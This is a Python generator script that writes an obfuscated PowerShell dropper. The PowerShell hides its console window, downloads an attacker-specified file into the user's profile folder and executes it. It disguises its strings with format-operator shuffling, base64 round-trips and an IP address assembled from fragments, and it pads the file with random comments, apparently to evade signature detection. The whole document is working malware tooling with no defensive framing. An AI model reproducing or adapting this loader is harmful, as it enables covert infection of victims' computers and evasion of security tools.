import sys
import os
import random

def get_random_string(length):
    # put your letters in the following string
    sample_letters = 'abcdefghijklmnopqrstuvwzyxABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    result_str = ''.join((random.choice(sample_letters) for i in range(length)))
    return result_str

def reallyRandom():
    finalcom = get_random_string(random.randint(15, 70))
    return finalcom.strip()

## argv[1] : urlpath
## argv[2] : downloadpath
## argv[3] : downloadname
f = open("sks/nexum.ps1", "w+")
f.write('''#''' + reallyRandom() + '''
#''' + reallyRandom() + '''
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'#''' +reallyRandom()+ '''''' + reallyRandom()+ '''
 $consolePtr = [Console.Window]::GetConsoleWindow() #''' + reallyRandom()+ '''
#''' + reallyRandom()+ '''''' + reallyRandom()+ '''''' + reallyRandom()+ '''
$asdiunalisu = ("{2}{3}{5}{1}{4}{0}{7}{8}{9}" -f 'de', 's','"','fsds','df,','f,s','adf','sda,f','.com','"') -replace ",", ""
$thpa = "/caASDsdf" + "sdouASDb" + ".exASDe"

#''' + reallyRandom()+ '''        #''' + reallyRandom()+ '''''' + reallyRandom()+ '''
  [Console.Window]::ShowWindow($consolePtr, 0)
    $athp = $thpa -replace "ASD", "" #''' + reallyRandom()+ '''
$adasdfsdafd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($asdiunalisu))
$fgikbsd2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($adasdfsdafd))

  $dfwafvasdt = ("{2}{3}{1}{4}{6}{0}{5}" -f 'fd,s','r,ew','wef,ewf','fwe',',safd','asdfas')
    $dfwafvasdf = $env:UserName    #''' + reallyRandom()+ '''
#''' + reallyRandom()+ '''''' + reallyRandom()+ '''''' + reallyRandom()+ '''
$fgikbsd1 = "DownloadFile" #''' + reallyRandom()+ '''   #''' + reallyRandom()+ '''''' + reallyRandom()+ '''
  Invoke-Expression $fgikbsd2   #''' + reallyRandom()+ '''     #''' + reallyRandom()+ '''
#''' + reallyRandom()+ '''
        $dsafdfssadf = "''' + sys.argv[1].strip() + '''" # URL PATH HERE
$934t8oi = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($asdiunalisu))  #''' + reallyRandom()+ '''''' + reallyRandom()+ '''
$ipadr = ("{1}{0}{2}{4}{3}" -f '23','243.','.163.', '185:1', '234')
$adgarvcxv = "DownloadFile"

$fgikbsd2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($934t8oi))
 #''' + reallyRandom()+ '''             #''' + reallyRandom()+ '''
      $ipadr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ipadr)) #''' + reallyRandom()+ '''      #''' +reallyRandom()+ '''       ''' + reallyRandom()+ '''
Invoke-Expression $fgikbsd2
      $vlwuibe = ("{0}{4}{3}{1}{2}" -f 'C:','ers','\\','Us','\\')
                $gdafrw = $vlwuibe + $dfwafvasdf + "\\''' + sys.argv[2].strip() + '\\' + sys.argv[3].strip() +'''"
   Invoke-WebRequest -Uri $dsafdfssadf -OutFile $gdafrw
          #''' + reallyRandom()+ ''' #''' + reallyRandom()+ ''' #''' + reallyRandom()+ ''' #''' + reallyRandom()+ '''
#''' + reallyRandom()+ ''' #''' + reallyRandom()+ '''
$934t9oi = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($athp))
    $aaoisu2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ipadr))
#''' + reallyRandom()+ ''' #''' + reallyRandom()+ '''
$soandi = $934t9oi + $aaoisu2  #''' + reallyRandom()+ ''' #''' + reallyRandom()+ ''' 
#''' + reallyRandom()+ ''' #''' + reallyRandom()+ '''
$asdiunalisu = ("{2}{3}{5}{1}{4}{0}{7}{8}{9}" -f 'asd', 'gtre','"','fsfs','dsdff,','f,sj','yrf','sas,d','.net','"') -replace ",", ""#''' +reallyRandom()+ '''
$daiuflbads = $vlwuibe
  $licubsal = $dfwafvasdf
#''' + reallyRandom()+ ''' #''' + reallyRandom()+ '''
$trgrdgfsaf = New-Object System.Net.WebClient #''' + reallyRandom()+ '''#''' + reallyRandom()+ '''
                                                   $trgrdgfsaf.DownloadFile($dsafdfssadf, $gdafrw) #''' + reallyRandom()+ '''
                $pdafrtrasrdsfg = $daiuflbads + $licubsal + "\\''' + sys.argv[2].strip() + '''"
      Set-Location -Path $pdafrtrasrdsfg #''' + reallyRandom()+ '''#''' + reallyRandom()+ '''
  
  $Command = ".\\''' + sys.argv[3].strip() + '''"
   Invoke-Expression $Command #''' + reallyRandom()+ '''
#''' +reallyRandom()+ '''
    $asoudi = Write-Output $soandi
                Invoke-Expression $asoudi #''' +reallyRandom()+ '''
''')
f.close()
print(sys.argv[4])